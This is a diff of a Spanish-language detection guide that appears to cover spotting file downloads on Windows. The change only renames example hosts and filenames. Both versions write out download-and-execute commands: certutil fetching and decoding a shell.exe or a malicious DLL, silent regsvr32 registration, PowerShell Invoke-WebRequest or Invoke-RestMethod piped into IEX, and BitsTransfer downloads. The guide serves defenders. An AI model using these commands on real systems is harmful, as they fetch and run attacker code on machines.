@@ -2638,14 +2638,14 @@ certutil -decode .\bypass.txt malware.exe
 
 Descarga de ficheros desde una dirección URL a local a través de certutil.
 ```cmd
-certutil.exe -urlcache -split -f http://192.168.1.10/shell.exe shell.exe
+certutil.exe -urlcache -split -f https://domain.com/shell.exe shell.exe
 ```
 
 Descarga de una dll maliciosa ofuscada previamente en un formato txt, decodifica y convierte la dll maliciosa a un formato de librería dll, con regsvr32 registra en modo silencioso la librería dll en el sistema.
 ```cmd
-certutil.exe -urlcache -split -f http://192.168.1.10/malwaredll.txt malwaredll.txt
-certutil -decode .\malwaredll.txt exploit.dll
-regsvr32 /s /u .\exploit.dll
+certutil.exe -urlcache -split -f https://domain.com/evildll.txt evildll.txt
+certutil -decode .\evildll.txt evildll.dll
+regsvr32 /s /u .\evildll.dll
 ```
 
 ### ▶️ Detectar descargas de ficheros realizadas a través de PowerShell usando "Invoke-WebRequest, Invoke-RestMethod, BitsTransfer"
@@ -2654,30 +2654,30 @@ Existen multitud de técnicas para la descarga y ejecución de ficheros a travé
 
 Invoke-WebRequest (IWR) e Invoke-Expression (IEX)
 ```ps
-Invoke-WebRequest -Uri 'https://domain.com/myfile.ps1' -OutFile "C:\temp\myfile.ps1"
-Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | Select-Object Content | IEX
-Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | IEX
+Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -OutFile "C:\temp\evilfile.exe"
+Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing | Select-Object Content | IEX
+Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing | IEX
 
-IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing).Content
-IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing)
-IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/sysinfo.txt')
+IEX (Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing).Content
+IEX (Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing)
+IEX (New-Object Net.WebClient).DownloadString('https://domain.com/evilfile.exe')
 ```
 
 Invoke-RestMethod (IRM) e Invoke-Expression (IEX)
 ```ps
-Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt' | IEX
+Invoke-RestMethod -Method Get -Uri 'https://domain.com/evilfile.exe' | IEX
 
-IEX (Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt')
+IEX (Invoke-RestMethod -Method Get -Uri 'https://domain.com/evilfile.exe')
 ```
 
 BitsTransfer synchronously
 ```ps
-Start-BitsTransfer 'https://domain.com/myfile.ps1' -Destination "C:\temp\myfile.ps1"
+Start-BitsTransfer 'https://domain.com/evilfile.exe' -Destination "C:\temp\evilfile.exe"
 ```
 
 BitsTransfer asynchronously
 ```ps
-Start-BitsTransfer 'https://domain.com/myfile.ps1' -Destination "C:\temp\myfile.ps1" -Asynchronous
+Start-BitsTransfer 'https://domain.com/evilfile.exe' -Destination "C:\temp\evilfile.exe" -Asynchronous
 ```
 "BitsTransfer asynchronously" agrega un nuevo trabajo del servicio de transferencia de bits en segundo plano, esto es persistente incluso si la sesión de PowerShell se cierra. Para ver los trabajos en cola se usa "Get-BitsTransfer" y para completar el trabajo y descargar el archivo "Complete-BitsTransfer".
 ```ps
